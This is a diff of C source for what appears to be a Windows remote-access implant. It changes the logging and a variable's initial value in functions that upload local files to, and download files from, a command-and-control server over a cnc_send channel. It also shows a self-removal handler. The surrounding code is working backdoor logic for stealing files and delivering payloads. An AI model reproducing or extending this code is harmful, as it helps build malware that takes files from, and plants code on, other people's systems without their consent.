@@ -178,7 +178,7 @@ void handle_suicide()
 void handle_upload_file()
 {
     int return_code = 0;
-    unsigned long bytes_read = 0;
+    unsigned long bytes_read = -1;
     HANDLE file = NULL;
     struct file_cmd cmd = {};
 
@@ -200,7 +200,6 @@ void handle_upload_file()
         goto cleanup;
     }
     cmd.local_path[cmd.local_path_len] = 0;
-    log_info("Uploading file to: %s", cmd.local_path);
 
     if ((file = CreateFile(cmd.local_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
     {
@@ -215,6 +214,7 @@ void handle_upload_file()
     }
 
     cmd.file_size = GetFileSize(file, NULL);
+    log_info("Uploading file: %s (%lu)", cmd.local_path, cmd.file_size);
     if (cnc_send(&cmd.file_size, sizeof(cmd.file_size)) != sizeof(cmd.file_size))
     {
         return_code = E_CONNECTION_CLOSED;
@@ -274,7 +274,6 @@ void handle_download_file()
         goto cleanup;
     }
     cmd.local_path[cmd.local_path_len] = 0;
-    log_info("Downloading file to: %s", cmd.local_path);
 
     if ((file = CreateFile(cmd.local_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
     {
@@ -293,6 +292,7 @@ void handle_download_file()
         return_code = E_CONNECTION_CLOSED;
         goto cleanup;
     }
+    log_info("Downloading file: %s (%lu)", cmd.local_path, cmd.file_size);
 
     while (written_file_bytes != cmd.file_size)
     {
